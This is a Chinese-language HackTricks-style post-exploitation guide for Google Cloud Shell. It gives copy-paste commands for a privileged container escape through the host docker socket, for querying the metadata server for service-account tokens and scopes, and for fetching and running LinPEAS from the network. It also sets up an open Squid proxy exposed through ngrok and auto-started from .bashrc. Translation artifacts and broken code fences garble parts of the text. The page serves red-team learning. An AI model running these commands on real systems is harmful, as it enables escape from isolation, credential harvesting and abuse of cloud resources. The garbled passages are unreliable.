# GCP - Cloud Shell Post Exploitation

<details>

<summary><strong>从零到英雄学习AWS黑客技术</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧**
* &#x20;github仓库。

</details>

## Cloud Shell

有关Cloud Shell的更多信息，请查看：

{% content-ref url="../gcp-services/gcp-cloud-shell-enum.md" %}
[gcp-cloud-shell-enum.md](../gcp-services/gcp-cloud-shell-enum.md)
{% endcontent-ref %}

### 容器逃逸

请注意，Google Cloud Shell在容器内运行，您可以**轻松逃逸到宿主机**，方法如下：

{% code overflow="wrap" %}
```bash
sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name escaper -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock start escaper
sudo docker -H unix:///google/host/var/run/docker.sock exec -it escaper /bin/sh
```
```markdown
{% endcode %}

谷歌不认为这是一个漏洞，但它能让你更广泛地了解该环境中发生的事情。

此外，请注意，从主机上你可以找到一个服务账户令牌：

{% code overflow="wrap" %}
```
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/"
default/
vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/
```
```
未更改的内容保持原样。
```

具有以下范围：

```
未更改的内容保持原样。
```
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/scopes"

https://www.googleapis.com/auth/devstorage.read_only
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
```
{% endcode %}

使用LinPEAS枚举元数据：

{% code overflow="wrap" %}
```bash
cd /tmp
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
sh linpeas.sh -o cloud
```
{% endcode %}

在使用 [https://github.com/carlospolop/bf\_my\_gcp\_permissions](https://github.com/carlospolop/bf\_my\_gcp\_permissions) 和 Service Account 的 token 后，**未发现任何权限**...

### 将其用作代理

如果你想将你的 google cloud shell 实例用作代理，你需要运行以下命令（或将它们插入 .bashrc 文件中）：
```bash
sudo apt install -y squid
```
仅供参考，Squid 是一个 HTTP 代理服务器。创建一个名为 **squid.conf** 的文件，并使用以下设置：
```bash
http_port 3128
cache_dir /var/cache/squid 100 16 256
acl all src 0.0.0.0/0
http_access allow all
```
复制 **squid.conf** 文件到 **/etc/squid**
```bash
sudo cp squid.conf /etc/squid
```
```bash
sudo systemctl start squid
```
```bash
sudo service squid start
```
使用ngrok使代理可以从外部访问：
```bash
./ngrok tcp 3128
```
```markdown
运行后复制 tcp:// URL。如果您想从浏览器运行代理，建议删除 tcp:// 部分和端口，并将端口放入浏览器代理设置的端口字段中（squid 是一个 HTTP 代理服务器）。

为了在启动时更好地使用，.bashrc 文件应该包含以下行：
```
```bash
sudo apt install -y squid
sudo cp squid.conf /etc/squid/
sudo service squid start
cd ngrok;./ngrok tcp 3128
```
```markdown
以下指南摘自 [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)。查看该页面以获取在Cloud Shell中运行任何类型软件（数据库甚至Windows）的其他疯狂想法。

<details>

<summary><strong>从零开始学习AWS黑客技术，成为英雄，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

其他支持HackTricks的方式：

* 如果您希望在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来**分享您的黑客技巧**。

</details>
```
